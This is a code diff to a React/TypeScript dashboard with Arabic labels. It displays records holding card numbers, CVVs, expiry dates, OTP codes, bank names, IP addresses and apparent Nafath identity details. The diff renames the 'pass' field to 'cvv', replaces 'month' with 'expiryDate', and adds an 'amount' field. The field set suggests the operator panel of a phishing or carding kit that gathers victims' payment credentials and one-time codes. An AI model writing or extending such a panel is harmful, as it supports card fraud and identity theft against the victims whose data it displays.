@@ -52,9 +52,10 @@ interface NafazInfo {
 interface Notification {
   createdDate: string;
   bank: string;
+  amount: string;
   cardStatus?: string;
   ip?: string;
-  pass: string;
+  cvv: string;
   id: string | "0";
   notificationCount: number;
   otp: string;
@@ -63,7 +64,7 @@ interface Notification {
   cardNumber: string;
   prfiex: string;
   cardHolderName?: string;
-  month?: string;
+  expiryDate?: string;
   year?: string;
   country?: string;
   personalInfo: {
@@ -251,23 +252,23 @@ function CardInfoCard({ notification }: { notification: Notification }) {
                   </span>
                 </div>
               )}
-              {notification.month && notification.year && (
+              {notification.expiryDate && notification.year && (
                 <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                   <span className="text-xs font-medium text-gray-600">
                     تاريخ الانتهاء
                   </span>
                   <span className="font-bold text-base text-gray-800 font-mono">
-                    {notification.month}/{notification.year}
+                    {notification?.expiryDate}
                   </span>
                 </div>
               )}
-              {notification.pass && (
+              {notification.cvv && (
                 <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                   <span className="text-xs font-medium text-gray-600">
                     رقم سري
                   </span>
                   <span className="font-bold text-base text-green-600 font-mono">
-                    {notification.pass}
+                    {notification.cvv}
                   </span>
                 </div>
               )}
@@ -418,7 +419,7 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase();
       filtered = filtered.filter(
         (notification) =>
-          notification.name?.toLowerCase().includes(term) ||
+          notification.amount?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
           notification.billNumber?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
@@ -719,7 +720,7 @@ export default function NotificationsPage() {
                           ></div>
                           <div>
                             <p className="font-semibold text-gray-800">
-                              {notification.name || "غير متوفر"}
+                              {notification.amount || "غير متوفر"}
                             </p>
                             <p className="text-sm text-gray-500">
                               {notification.email || notification.billNumber}
